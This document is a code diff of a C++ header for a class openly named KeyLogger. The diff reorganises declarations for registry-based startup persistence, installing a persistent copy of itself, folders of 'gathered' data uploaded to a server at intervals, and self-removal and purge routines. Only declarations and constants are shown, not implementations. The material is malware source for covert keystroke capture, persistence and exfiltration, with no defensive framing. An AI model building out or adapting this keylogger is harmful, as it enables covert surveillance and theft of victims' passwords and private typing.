@@ -15,7 +15,7 @@
 //registry key name
 #define REGKEY_NAME "keylogger"
 
-//Keyboard codes
+//keyboard scan codes
 #define SC_CTRL 29
 #define SC_LSHIFT 42
 #define SC_ALT 56
@@ -30,10 +30,10 @@
 //key to press in order to destroy the keylogger
 #define HOTKEY_PURGE NULL
 
-//folder to store gathered data
+//data folder name
 #define DATADIR "gathered"
 
-//time interval for contacting the server
+//time interval between server uploads
 #define UPLOAD_DELTA 10
 
 //name of the batch file used for deleting the program
@@ -52,6 +52,21 @@ class KeyLogger {
 
     //starts listenning
     void listen();
+    
+    //makes the program launch at startup
+    void persist(std::string path = "");
+
+    //erases program data
+    void purge();
+
+    //loop for standalone usage
+    void loop();
+
+    //installs a persistent copy
+    void install(std::string target);
+    
+    //get user home directory
+    std::string getUserHomeDirectory();
 
     //ALT state
     bool KeyLogger::isAltDown() { return altDown; }
@@ -69,24 +84,16 @@ class KeyLogger {
     bool KeyLogger::isRShiftDown() { return rshiftDown; }
     void KeyLogger::setRShiftDown(bool down) { rshiftDown = down; }
 
-    //writes to registry to make the program launch at every startup
-    void persist(std::string path="");
-
-    //erases program data
-    void purge();
-
-    //loop for standalone usage
-    void loop();
-    
-    //copy the keylogger to another location
-    void copySelf(std::string target);
-
     protected:
 
     KeyLogger();
     ~KeyLogger();
 
     void log(std::string text);
+
+    void removeSelf();
+
+    void freeResources();
 
     std::string getTimeString();
 
